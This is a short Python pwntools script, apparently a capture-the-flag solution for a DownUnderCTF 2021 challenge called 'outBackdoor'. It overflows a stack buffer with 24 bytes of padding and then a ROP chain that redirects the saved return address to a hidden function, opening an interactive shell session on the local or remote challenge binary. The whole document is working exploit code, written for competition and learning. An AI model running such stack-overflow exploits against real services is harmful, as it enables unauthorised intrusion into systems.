from pwn import *

e = ELF("./outBackdoor",checksec=False)
context.binary = e

if args.REMOTE:
  pipe = remote("pwn-2021.duc.tf", 31921)
else:
  pipe = process(e.path)

offset=24

r = ROP(e)
r.raw(r.find_gadget(["ret"])) # 16-byte align stack
r.raw(p64(e.symbols["outBackdoor"]))

# overwrite saved RIP to point to outBackdoor() function
pipe.sendlineafter(b"song?\n",b"A"*offset + r.chain())

pipe.interactive()
